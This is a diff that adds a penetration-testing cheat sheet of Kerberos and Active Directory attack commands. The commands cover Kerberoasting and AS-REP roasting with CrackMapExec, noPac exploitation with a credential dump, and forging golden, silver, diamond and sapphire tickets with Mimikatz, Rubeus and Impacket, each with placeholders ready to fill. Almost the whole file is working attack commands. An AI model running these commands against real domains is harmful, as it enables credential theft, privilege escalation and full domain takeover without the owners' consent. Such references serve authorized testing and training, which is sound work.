@@ -1,0 +1,25 @@
+% kerberos,kerberoast,asreproast,nopac,cerbero,tickets,impacket,mimikatz,rubeus
+
+# Cerbero: ASKTGS with AES key
+cerbero ask -u <domain>/<user> --aes <aes_key> -k <target_ip> -vv
+
+# CrackMapExec: Kerberoasting
+crackmapexec ldap -u <user> -p <password> --kerberoast <target_file>
+
+# CrackMapExec: ASREPRoasting
+crackmapexec ldap <dc_fqdn> -u <user> -p <password> --asreproast <target_file>
+
+# NoPAC exploitation
+python noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate <impersonated_user> -dump
+
+# Golden Ticket (Mimikatz)
+mimikatz "kerberos::golden /user:<user> /domain:<fqdn> /sid:<domain_sid> /krbtgt:<ntlm_hash> /ticket:<output_ticket_file>"
+
+# Silver Ticket (Rubeus)
+Rubeus.exe silver /service:<spn> /aes256:<aes256_or_rc4> /user:<user> /domain:<domain> /sid:<user_sid>
+
+# Diamond Ticket (Rubeus)
+Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<uid> /groups:<rid> /krbkey:<krbtgt_key>
+
+# Sapphire Ticket (Impacket)
+ticketer.py -request -user <lowpriv_user> -password <password> -impersonate <target_user> -domain <domain> -domain-sid <sid> -aesKey <aes_key> <final_username>
